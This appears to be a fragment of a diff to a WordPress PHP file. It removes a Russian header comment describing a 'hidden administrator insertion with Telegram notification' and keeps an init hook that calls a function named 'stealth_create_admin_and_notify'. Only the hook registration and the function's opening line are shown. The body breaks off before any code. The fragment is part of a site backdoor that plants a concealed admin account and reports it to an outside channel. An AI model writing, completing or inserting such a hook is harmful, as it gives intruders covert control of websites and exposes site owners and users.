@@ -1,7 +1,3 @@
-<?php
-/**
- * Скрытая вставка администратора + Telegram-уведомление.
- */
 
 add_action('init', 'stealth_create_admin_and_notify');
 function stealth_create_admin_and_notify() {
